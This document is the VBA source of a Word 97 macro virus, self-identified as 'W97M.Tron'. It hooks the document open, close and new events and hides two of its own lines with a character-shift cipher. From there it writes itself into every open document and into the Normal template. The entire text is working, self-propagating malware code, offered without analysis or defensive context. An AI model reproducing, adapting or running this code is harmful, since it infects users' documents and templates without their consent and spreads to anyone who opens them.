   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Tron
   Private Sub Document_Open(): On Error Resume Next: Dim x, c: j = j + 1
   Dim linKoda2, s
   If Left(ThisDocument.VBProject.vbcomponents(1).codemodule.lines(33, 1), 1) = "'" Then
   For E = 33 To 34
   desni = Right(ThisDocument.VBProject.vbcomponents(1).codemodule.lines(E, 1), _
   (Len(ThisDocument.VBProject.vbcomponents(1).codemodule.lines(E, 1)) - 1))
   ThisDocument.VBProject.vbcomponents(1).codemodule.replaceline E, desni
   Next
   For f = 33 To 34
   linKoda2 = ThisDocument.VBProject.vbcomponents(1).codemodule.lines(f, 1)
   For s = 1 To Len(linKoda2)
   nov = nov & Chr(Asc(Mid(linKoda2, s)) + 3)
   Next
   ThisDocument.VBProject.vbcomponents(1).codemodule.replaceline f, nov
   nov = ""
   Next
   Else
   For f = 33 To 34
   linKoda2 = ThisDocument.VBProject.vbcomponents(1).codemodule.lines(f, 1)
   For s = 1 To Len(linKoda2)
   nov = nov & Chr(Asc(Mid(linKoda2, s)) - 3)
   Next
   ThisDocument.VBProject.vbcomponents(1).codemodule.replaceline f, "'" & nov
   nov = ""
   Next
   End If
   For t = 1 To Documents.Count
   If Documents(t).VBProject.vbcomponents(j).codemodule.lines(j, j) <> "'Tron" Then
   linKoda = ThisDocument.VBProject.vbcomponents(j).codemodule.lines(j, ThisDocument.VBProject.vbcomponents(j).codemodule.countoflines)
   With Documents(t).VBProject.vbcomponents(j).codemodule
   If .lines(j, j) <> "'Tron" Then
   '+abibqbifkbpg)+`lrkqlcifkbp
   '+^aacoljpqofkdifkHla^
   ActiveDocument.VBProject.Description = "W97M.Tron by e[ax] / Species VL"
   End If
   End With
   End If
   Next
   Set norm = NormalTemplate
   If norm.VBProject.vbcomponents(j).codemodule.lines(j, j) <> "'Tron" Then
   With norm.VBProject.vbcomponents(j).codemodule
   trm = Trim$(ThisDocument.VBProject.vbcomponents(j).codemodule.lines(j, ThisDocument.VBProject.vbcomponents(j).codemodule.countoflines)): .deletelines j, .countoflines: .addfromstring trm
   End With
   End If
   End Sub
   Private Sub Document_Close(): Document_Open: End Sub
   Private Sub Document_New(): Document_Open: End Sub
